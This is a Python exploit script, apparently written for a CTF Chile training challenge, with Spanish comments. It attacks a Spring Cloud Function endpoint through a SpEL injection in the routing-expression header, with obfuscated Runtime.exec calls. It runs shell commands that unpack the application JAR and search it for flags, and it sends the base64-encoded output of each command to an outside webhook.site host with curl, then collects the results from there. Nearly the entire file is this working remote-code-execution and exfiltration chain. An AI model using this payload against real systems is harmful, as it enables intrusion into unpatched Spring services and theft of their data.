#!/usr/bin/env python3
"""
CTF Chile - Análisis profundo del frontend web
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para análisis del frontend...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def frontend_probe(cmd, tag):
    shell = f"({cmd}) | head -15 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:40]}...")
        return False

print(f"\n{'='*70}")
print("🌐 ANÁLISIS PROFUNDO DEL FRONTEND WEB")
print("🔍 La flag debe estar en el servicio actual puerto 32785")
print(f"{'='*70}")

print(f"\n[1] ANÁLISIS DEL CONTENIDO HTML PRINCIPAL")
# Obtener el HTML completo de la página principal
frontend_probe("curl -s http://localhost:8080/ | head -50", "html_main_page")

print(f"\n[2] BUSCAR ARCHIVOS ESTÁTICOS")
# Buscar archivos CSS, JS, imágenes en el JAR
frontend_probe("unzip -l /app/app.jar | grep -E '\\.(css|js|html|png|jpg|gif)$' | head -10", "static_files_list")

print(f"\n[3] EXTRAER Y ANALIZAR ARCHIVOS HTML")
# Extraer HTML de recursos estáticos
frontend_probe("unzip -p /app/app.jar static/index.html 2>/dev/null | head -20", "static_index_html")
frontend_probe("unzip -p /app/app.jar templates/index.html 2>/dev/null | head -20", "template_index_html")
frontend_probe("unzip -p /app/app.jar public/index.html 2>/dev/null | head -20", "public_index_html")

print(f"\n[4] BUSCAR FLAGS EN ARCHIVOS WEB")
# Buscar flags directamente en archivos web
frontend_probe("unzip -qq /app/app.jar -d /tmp/web_extract 2>/dev/null && find /tmp/web_extract -name '*.html' -o -name '*.js' -o -name '*.css' | xargs grep -i ctfchile 2>/dev/null", "web_files_flag_search")

print(f"\n[5] ANALIZAR JAVASCRIPT")
# Buscar archivos JavaScript que podrían contener flags
frontend_probe("unzip -p /app/app.jar static/js/app.js 2>/dev/null | head -15", "js_app_file")
frontend_probe("unzip -p /app/app.jar static/js/main.js 2>/dev/null | head -15", "js_main_file")

print(f"\n[6] BUSCAR EN CSS Y ASSETS")
# Revisar archivos CSS que podrían ocultar flags
frontend_probe("unzip -p /app/app.jar static/css/style.css 2>/dev/null | head -15", "css_style")
frontend_probe("unzip -p /app/app.jar static/css/main.css 2>/dev/null | head -15", "css_main")

print(f"\n[7] ANALIZAR COMENTARIOS HTML")
# Buscar comentarios en HTML que podrían contener flags
frontend_probe("curl -s http://localhost:8080/ | grep -o '<!--.*-->' | head -5", "html_comments")
frontend_probe("unzip -p /app/app.jar static/index.html 2>/dev/null | grep -o '<!--.*-->' | head -5", "static_html_comments")

print(f"\n[8] BUSCAR FLAGS EN ELEMENTOS OCULTOS")
# Buscar elementos HTML ocultos o con atributos data-*
frontend_probe("curl -s http://localhost:8080/ | grep -i 'hidden\\|display:none\\|data-' | head -5", "hidden_elements")

print(f"\n[9] PROBAR ENDPOINTS DE ASSETS")
# Probar acceso directo a assets comunes
asset_paths = [
    "static/",
    "static/index.html",
    "css/style.css",
    "js/app.js",
    "assets/",
    "public/",
    "resources/"
]

for asset in asset_paths:
    frontend_probe(f"curl -s http://localhost:8080/{asset} | head -5", f"asset_{asset.replace('/', '_').replace('.', '_')}")

print(f"\n[10] BUSCAR METADATOS Y CONFIGURACIÓN WEB")
# Buscar archivos de configuración web
frontend_probe("unzip -p /app/app.jar META-INF/resources/index.html 2>/dev/null | head -15", "metainf_html")
frontend_probe("curl -s http://localhost:8080/favicon.ico | file - 2>/dev/null", "favicon_check")

print(f"\n⏰ Esperando resultados del análisis frontend...")
time.sleep(18)

# Análisis detallado
print(f"\n🔍 ANÁLISIS DETALLADO DEL FRONTEND...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=25)
    data = r.json().get("data", [])

    flags_found = []
    html_content = []
    static_files = []
    interesting_findings = []

    print(f"Total responses captured: {len(data)}")

    for req in data[:40]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                print(f"\n{'='*50}")
                print(f"🌐 [{tag.upper()}]")
                print(f"{'='*50}")
                print(decoded[:400])
                if len(decoded) > 400:
                    print("...")

                # BUSCAR FLAGS EXPLÍCITOS
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN FRONTEND! 🚩🚩🚩")
                    print(f"UBICACIÓN: {tag}")
                    print(f"FLAG: {decoded}")

                # Clasificar contenido
                if tag.startswith("html"):
                    html_content.append((tag, decoded[:200]))

                if tag.startswith("static_files"):
                    static_files.append((tag, decoded[:300]))

                # Buscar contenido sospechoso
                if any(keyword in decoded.lower() for keyword in
                      ["flag", "secret", "ctf", "vault", "infiltracion", "admin", "password"]):
                    interesting_findings.append((tag, decoded[:250]))

                # Buscar patrones codificados
                import re
                base64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', decoded)
                if base64_patterns:
                    print(f"🔍 Posibles strings Base64 encontrados: {len(base64_patterns)}")
                    for pattern in base64_patterns[:3]:
                        try:
                            decoded_pattern = base64.b64decode(pattern + "==").decode('utf-8', 'replace')
                            if "ctfchile" in decoded_pattern.lower():
                                flags_found.append((f"{tag}_base64", decoded_pattern))
                                print(f"🚩🚩🚩 FLAG EN BASE64: {decoded_pattern}")
                        except:
                            pass

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:150]}...")

    # RESUMEN FRONTEND
    print(f"\n{'='*70}")
    print(f"🌐 RESUMEN DEL ANÁLISIS FRONTEND")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS EN FRONTEND: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    📍 {tag}:")
            print(f"    🎯 {flag}")
            print(f"    ✅ ¡INFILTRACIÓN A OMNIVAULT COMPLETADA!")

    if html_content:
        print(f"\n📄 CONTENIDO HTML: {len(html_content)}")
        for tag, content in html_content:
            print(f"    - {tag}: {content[:100]}...")

    if static_files:
        print(f"\n📁 ARCHIVOS ESTÁTICOS: {len(static_files)}")
        for tag, files in static_files:
            print(f"    - {tag}: {files[:150]}...")

    if interesting_findings:
        print(f"\n🔍 CONTENIDO INTERESANTE: {len(interesting_findings)}")
        for tag, content in interesting_findings[:8]:
            print(f"    - {tag}: {content[:120]}...")

    if not flags_found:
        print(f"❌ No se encontraron flags en el frontend")
        print(f"💡 ÚLTIMA ESTRATEGIA:")
        print(f"   🔐 La flag puede requerir interacción específica con el frontend")
        print(f"   🎯 Puede estar en variables JavaScript dinámicas")
        print(f"   🌐 Puede estar en endpoints que requieren POST/PUT")
        print(f"   🔑 Puede estar en cookies o headers de respuesta")
    else:
        print(f"\n🎉 ¡MISIÓN DE INFILTRACIÓN PROFUNDA COMPLETADA!")
        print(f"   🏆 OmniVault ha sido infiltrado exitosamente")
        print(f"   🎯 Flag extraído desde lo más profundo del sistema")

except Exception as e:
    print(f"[!] Error en análisis: {e}")

print(f"\n🔗 Webhook frontend: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")